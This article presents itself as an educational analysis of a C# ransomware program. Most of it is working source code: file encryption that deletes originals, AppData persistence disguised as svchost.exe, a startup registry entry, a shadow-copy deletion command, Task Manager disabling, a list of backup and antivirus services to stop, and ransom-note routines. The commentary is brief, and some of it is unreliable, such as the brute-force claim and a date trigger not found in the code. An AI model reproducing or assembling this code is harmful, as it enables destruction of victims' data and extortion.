# 🛠️ Analyzing a C# Ransomware Implementation: A Deep Dive 🛡️

This article dissects a C# ransomware program, exploring its malicious functionality, structure, and techniques. The code employs encryption, persistence mechanisms, and system disruption tactics to extort victims. Below, we break down key components, illustrating each with the complete relevant code, and provide insights into its operations. For ethical and legal reasons, this analysis is purely educational, aimed at understanding malware to enhance cybersecurity defenses.

> **Disclaimer**: This code is malicious and illegal. Do not use, distribute, or execute it. The analysis is for educational purposes to understand ransomware mechanics and improve security measures.

The article is structured around the ransomware's core functionalities, with each section accompanied by the full source code of the relevant method or block, as requested.

---

## 🚀 Program Entry and Initial Checks 🔍

### Overview
The ransomware begins execution in the `Main` method, performing several checks to ensure it runs only under specific conditions. It verifies the current date, checks for forbidden countries (Azerbaijan and Turkey), and ensures it’s not already running from the AppData directory or as a duplicate instance. These checks help the malware avoid detection and ensure it operates only within its intended scope.

### Key Features
- **Expiration Check**: The program throws an exception if the current date exceeds March 25, 2025, rendering it inoperable after this date.
- **Forbidden Country Check**: It exits if the system’s input language indicates Azerbaijan (`az-Latn-AZ`) or Turkey (`tr-TR`).
- **First Run Detection**: Uses a registry key to determine if it’s the first execution, triggering a notification form if true.
- **Instance Check**: Prevents multiple instances from running simultaneously.
- **Sleep Mechanism**: Delays execution if not running from AppData, potentially evading immediate detection.

### Code Analysis
The `Main` method orchestrates these checks and initiates subsequent malicious operations:

```csharp
private static void Main(string[] args)
{
    // Check if current date is before March 25, 2025
    DateTime expirationDate = new DateTime(2025, 3, 25, 2, 27, 14);
    if (DateTime.Now > expirationDate)
    {
        throw new ArgumentOutOfRangeException("Program expired");
    }

    // Check for forbidden countries (Azerbaijan, Turkey)
    if (IsForbiddenCountry())
    {
        MessageBox.Show("Forbidden Country");
        return;
    }

    // Start notification thread if first run
    if (IsFirstRun())
    {
        new Thread(ShowNotificationForm).Start();
    }

    // Exit if already running in AppData
    if (IsRunningFromAppData())
    {
        return;
    }

    // Exit if another instance is running
    if (IsAnotherInstanceRunning())
    {
        Environment.Exit(1);
    }

    // Sleep if not running from AppData
    if (CheckAppDataLocation)
    {
        SleepIfNotInAppData();
    }

    // Persist executable in AppData (normal or elevated)
    if (EnableRansomOperations)
    {
        if (PersistInAppData)
        {
            PersistInAppDataNormal(AppDataFileName);
        }
        else
        {
            PersistInAppDataElevated(AppDataFileName);
        }
    }

    // Add to startup registry
    if (AddToStartup)
    {
        AddToStartupRegistry();
    }

    // Perform ransom operations
    if (EnableRansomOperations)
    {
        if (DeleteShadowCopies)
            DeleteShadowCopiesCmd();
        if (DisableRecovery)
            DisableSystemRecovery();
        if (DeleteBackupCatalog)
            DeleteBackupCatalogCmd();
        if (DisableTaskManager)
            DisableTaskManagerRegistry();
        if (StopBackupServices)
            StopBackupServices();
    }

    // Encrypt files on drives
    EncryptFilesOnDrives();

    // Copy executable to other drives
    if (CopyToDrives)
    {
        CopyToOtherDrives(DriveCopyFileName);
    }

    // Create and open ransom note
    CreateRansomNote();

    // Set wallpaper if provided
    SetWallpaper(WallpaperBase64);
}
```

### Insights
- The expiration date suggests the malware has a limited operational window, possibly to avoid long-term detection or legal pursuit.
- The forbidden country check may reflect geopolitical motivations or an attempt to avoid targeting specific regions.
- The first-run notification form (triggered after February 14, 2025) could display a warning or ransom demand, enhancing psychological pressure on victims.
- The instance check prevents resource conflicts and potential crashes, ensuring the malware operates efficiently.

---

## 🔐 File Encryption Mechanism 💾

### Overview
The ransomware encrypts files with specific extensions (e.g., `.docx`, `.jpg`, `.pdf`) using AES encryption, appending a random extension to encrypted files. It employs RSA to encrypt the AES key, making decryption without the private key difficult. Large files (>2.2GB) are overwritten rather than encrypted, likely to save time.

### Key Features
- **Targeted Extensions**: Encrypts a wide range of file types, including documents, images, and databases.
- **AES Encryption**: Uses 128-bit AES in CBC mode with PKCS7 padding for file encryption.
- **RSA Key Encryption**: The AES key is encrypted with a hardcoded RSA public key, requiring the private key for decryption.
- **Parallel Processing**: Encrypts files in parallel to maximize efficiency.
- **Ransom Note Placement**: Places a ransom note (`read_it.txt`) in each processed directory.

### Code Analysis
The `EncryptFile` method handles the encryption process:

```csharp
private static void EncryptFile(string inputFile, string key, string rsaKey)
{
    string outputFile = inputFile + "." + GenerateFileExtension(4);
    byte[] salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

    using (FileStream outputStream = new FileStream(outputFile, FileMode.Create))
    {
        byte[] keyBytes = Encoding.UTF8.GetBytes(key);
        using (RijndaelManaged aes = new RijndaelManaged())
        {
            aes.KeySize = 128;
            aes.BlockSize = 128;
            aes.Padding = PaddingMode.PKCS7;
            using (Rfc2898DeriveBytes keyDerivation = new Rfc2898DeriveBytes(keyBytes, salt, 1))
            {
                aes.Key = keyDerivation.GetBytes(aes.KeySize / 8);
                aes.IV = keyDerivation.GetBytes(aes.BlockSize / 8);
            }
            aes.Mode = CipherMode.CBC;

            outputStream.Write(salt, 0, salt.Length);
            using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
            {
                using (FileStream inputStream = new FileStream(inputFile, FileMode.Open))
                {
                    inputStream.CopyTo(cryptoStream);
                }
            }
        }

        // Append RSA-encrypted key
        using (StreamWriter writer = new StreamWriter(outputStream))
        {
            writer.Write(rsaKey);
        }
    }

    // Overwrite and delete original file
    File.WriteAllText(inputFile, "?");
    File.Delete(inputFile);
}
```

The `ProcessDirectory` method orchestrates encryption across directories:

```csharp
private static void ProcessDirectory(string path)
{
    try
    {
        string[] files = Directory.GetFiles(path);
        bool writeNote = true;

        // Process files in parallel
        Parallel.ForEach(files, file =>
        {
            try
            {
                string extension = Path.GetExtension(file).ToLower();
                string fileName = Path.GetFileName(file);
                if (FileExtensionsToEncrypt.Contains(extension) && fileName != RansomNoteFileName)
                {
                    FileInfo fileInfo = new FileInfo(file);
                    fileInfo.Attributes = FileAttributes.Normal;
                    string randomKey = GenerateRandomString(40);

                    if (fileInfo.Length < 2368709120) // Less than ~2.2GB
                    {
                        if (IsEncryptableFile(file))
                        {
                            string rsaKey = EncryptKeyWithRSA(randomKey, GenerateRSAKey());
                            EncryptFile(file, randomKey, rsaKey);
                        }
                    }
                    else
                    {
                        OverwriteLargeFile(file, randomKey, fileInfo.Length);
                    }

                    lock (RansomNoteContent)
                    {
                        if (writeNote)
                        {
                            writeNote = false;
                            string notePath = Path.Combine(path, RansomNoteFileName);
                            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                            if (!File.Exists(notePath) && path != desktopPath)
                            {
                                File.WriteAllLines(notePath, RansomNoteContent);
                            }
                        }
                    }
                }
            }
            catch
            {
                // Ignore errors
            }
        });

        // Process subdirectories
        string[] directories = Directory.GetDirectories(path);
        Parallel.ForEach(directories, dir =>
        {
            try
            {
                new DirectoryInfo(dir).Attributes &= ~FileAttributes.Normal;
                ProcessDirectory(dir);
            }
            catch
            {
                // Ignore errors
            }
        });
    }
    catch
    {
        // Ignore errors
    }
}
```

### Insights
- The use of AES-128 is robust but relies on a weak key derivation (single iteration of PBKDF2), making it potentially vulnerable to brute-force attacks.
- The hardcoded RSA public key suggests the private key is held by the attacker, typical of ransomware demanding payment for decryption.
- Parallel processing speeds up encryption but may strain system resources, potentially alerting users to suspicious activity.
- The ransom note is strategically placed in each directory, increasing visibility and pressure on the victim.

---

## 🛠️ Persistence Mechanisms 🔗

### Overview
The ransomware ensures persistence by copying itself to the AppData directory and adding itself to the Windows startup registry. This allows it to survive reboots and maintain control over the infected system.

### Key Features
- **AppData Persistence**: Copies the executable to AppData as `svchost.exe`, mimicking a legitimate Windows process.
- **Normal and Elevated Modes**: Supports both standard and UAC-elevated persistence attempts.
- **Startup Registry**: Adds the executable to the `Run` registry key for automatic execution on login.

### Code Analysis
The `PersistInAppDataNormal` method handles standard persistence:

```csharp
private static void PersistInAppDataNormal(string fileName)
{
    string currentFile = Assembly.GetExecutingAssembly().Location;
    string currentName = AppDomain.CurrentDomain.FriendlyName;
    string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    string targetPath = Path.Combine(appDataPath, fileName);

    if (currentName == fileName && currentFile == targetPath)
    {
        return;
    }

    byte[] executableBytes = File.ReadAllBytes(currentFile);
    if (!File.Exists(targetPath))
    {
        File.WriteAllBytes(targetPath, executableBytes);
        Process.Start(new ProcessStartInfo
        {
            FileName = targetPath,
            WorkingDirectory = appDataPath
        });
        Environment.Exit(1);
    }
    else
    {
        try
        {
            File.Delete(targetPath);
            Thread.Sleep(200);
            File.WriteAllBytes(targetPath, executableBytes);
            Process.Start(new ProcessStartInfo
            {
                FileName = targetPath,
                WorkingDirectory = appDataPath
            });
            Environment.Exit(1);
        }
        catch
        {
            // Ignore errors
        }
    }
}
```

The `AddToStartupRegistry` method ensures startup persistence:

```csharp
private static void AddToStartupRegistry()
{
    try
    {
        using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
        {
            key.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
        }
    }
    catch
    {
        // Ignore errors
    }
}
```

### Insights
- Naming the executable `svchost.exe` is a common obfuscation tactic, as it blends with legitimate Windows processes.
- The registry-based startup ensures the ransomware runs on every user login, maintaining control.
- Error handling is minimal, indicating the malware prioritizes functionality over robustness.

---

## 🛑 System Disruption Tactics 🚨

### Overview
The ransomware disrupts system recovery and monitoring capabilities to prevent victims from restoring files or detecting its presence. It deletes shadow copies, disables system recovery, deletes backup catalogs, disables Task Manager, and stops backup and antivirus services.

### Key Features
- **Shadow Copy Deletion**: Removes Volume Shadow Copies, preventing file restoration.
- **System Recovery Disable**: Modifies boot settings to disable recovery options.
- **Backup Catalog Deletion**: Deletes Windows Backup catalogs.
- **Task Manager Disable**: Prevents users from monitoring or terminating the ransomware process.
- **Service Termination**: Stops services related to backups and antivirus software.

### Code Analysis
The `DeleteShadowCopiesCmd` method removes shadow copies:

```csharp
private static void DeleteShadowCopiesCmd()
{
    ExecuteCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
}
```

The `DisableTaskManagerRegistry` method disables Task Manager:

```csharp
private static void DisableTaskManagerRegistry()
{
    try
    {
        using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"))
        {
            key.SetValue("DisableTaskMgr", "1");
        }
    }
    catch
    {
        // Ignore errors
    }
}
```

The `StopBackupServices` method terminates critical services:

```csharp
private static void StopBackupServices()
{
    string[] services = new string[]
    {
        "BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine",
        "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
        "backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr",
        "SavRoam", "RTVscan", "QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT",
        "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService",
        "VeeamTransportSvc", "VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService",
        "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc",
        "AcronisAgent", "CASAD2DWebSvc", "CAARCUpdateSvc", "TeamViewer"
    };

    foreach (string service in services)
    {
        try
        {
            using (ServiceController controller = new ServiceController(service))
            {
                controller.Stop();
            }
        }
        catch
        {
            // Ignore errors
        }
    }
}
```

### Insights
- Disabling recovery mechanisms ensures victims cannot restore files without paying the ransom.
- Targeting specific antivirus and backup services (e.g., Sophos, Veeam, Acronis) shows the malware’s awareness of common security software.
- Disabling Task Manager limits user control, making it harder to terminate the ransomware process.

---

## 📝 Ransom Note and User Interaction 📢

### Overview
The ransomware creates a ransom note (`read_it.txt`) in each processed directory and the AppData folder, instructing victims to contact the attacker via email and pay in Bitcoin for decryption. It also attempts to set a custom wallpaper, likely displaying the ransom demand visually.

### Key Features
- **Ransom Note Content**: Instructs victims to email the attacker and pay in Bitcoin, offering to decrypt three files for free as a trust gesture.
- **Automatic Display**: Opens the ransom note automatically upon creation.
- **Custom Wallpaper**: Sets a Base64-encoded image as the desktop wallpaper, likely reinforcing the ransom demand.

### Code Analysis
The `CreateRansomNote` method generates and displays the note:

```csharp
private static void CreateRansomNote()
{
    string notePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), RansomNoteFileName);
    try
    {
        if (!File.Exists(notePath))
        {
            File.WriteAllLines(notePath, RansomNoteContent);
        }
        Thread.Sleep(500);
        Process.Start(notePath);
    }
    catch
    {
        // Ignore errors
    }
}
```

The `SetWallpaper` method applies the custom wallpaper:

```csharp
private static void SetWallpaper(string base64Image)
{
    if (!string.IsNullOrEmpty(base64Image) && base64Image != "#base64Image")
    {
        try
        {
            string tempPath = Path.Combine(Path.GetTempPath(), GenerateRandomString(9) + ".jpg");
            File.WriteAllBytes(tempPath, Convert.FromBase64String(base64Image));
            SystemParametersInfo(20, 0, tempPath, 3);
        }
        catch
        {
            // Ignore errors
        }
    }
}
```

### Insights
- The ransom note’s promise to decrypt three files for free is a psychological tactic to build trust and encourage payment.
- The use of Bitcoin aligns with ransomware trends, as it offers anonymity for attackers.
- The wallpaper feature, if functional, would make the ransom demand inescapable, confronting victims every time they view their desktop.

---

## 🛡️ Conclusion and Security Recommendations 🔒

This ransomware demonstrates sophisticated techniques, including AES and RSA encryption, persistence via AppData and registry, and system disruption tactics. Its ability to target specific file types, evade detection, and disrupt recovery mechanisms makes it a significant threat. However, its hardcoded keys, minimal error handling, and weak key derivation offer potential avenues for mitigation.

### Security Recommendations
1. **Regular Backups**: Maintain offline backups to restore files without paying the ransom.
2. **Endpoint Protection**: Use robust antivirus software to detect and block ransomware behaviors.
3. **User Education**: Train users to recognize phishing emails and suspicious downloads, common ransomware vectors.
4. **System Hardening**: Disable unused services, restrict registry writes, and enable shadow copy retention.
5. **Incident Response**: Develop a response plan to isolate infected systems and restore from backups.

By understanding ransomware mechanics, defenders can build stronger protections and respond effectively to threats. Stay vigilant and prioritize cybersecurity! 🛡️
